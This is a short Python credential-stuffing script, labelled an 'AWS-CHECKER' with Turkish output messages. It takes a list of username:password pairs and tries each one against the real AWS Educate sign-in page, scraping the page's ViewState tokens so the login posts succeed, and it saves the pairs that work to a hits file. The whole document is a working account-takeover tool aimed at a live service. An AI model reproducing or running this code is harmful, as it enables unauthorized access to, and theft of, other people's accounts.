import requests
import os
from bs4 import BeautifulSoup

giris = input(str("Dosya ismi:"))
a = open(giris,"r").readlines()
file = [s.rstrip() for s in a]
for lines in file:
    combo = lines.split(":")
    user_data = {
        'AJAXREQUEST': '_viewRoot',
        'loginPage:siteLogin:loginComponent:loginForm': 'loginPage:siteLogin:loginComponent:loginForm',
        'loginPage:siteLogin:loginComponent:loginForm:username': ''+combo[0],
        'loginPage:siteLogin:loginComponent:loginForm:password': ''+combo[1],
        'com.salesforce.visualforce.ViewStateVersion': '202009031813360944',
        'loginPage:siteLogin:loginComponent:loginForm:j_id10': 'loginPage:siteLogin:loginComponent:loginForm:j_id10',        
    }
    user_agent = {'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36'}
    with requests.session() as req:
        url = "https://www.awseducate.com/signin/SiteLogin"
        r = req.get(url)
        Soup = BeautifulSoup(r.content,"html5lib")
        user_data["com.salesforce.visualforce.ViewState"] = Soup.find(id="com.salesforce.visualforce.ViewState")["value"]
        user_data["com.salesforce.visualforce.ViewStateMAC"] = Soup.find(id="com.salesforce.visualforce.ViewStateMAC")["value"]
        giris_yap = req.post(url,data=user_data)
        if "Your login attempt has failed. Make sure the username and password are correct." in giris_yap.text:
            print("Calismayan hesap - ",combo[0],combo[1]+"  ####### MADE IN AFLEXTR(AWS-CHECKER)")
        else:
            hit = open("hits.txt","w")
            print("Calisan hesap + ",combo[0],combo[1]+"  ######## MADE IN AFLEXTR(AWS-CHECKER)")
            hit.write(combo[0])
            hit.write(":")
            hit.write(combo[1])
            hit.writelines("")
            hit.close()
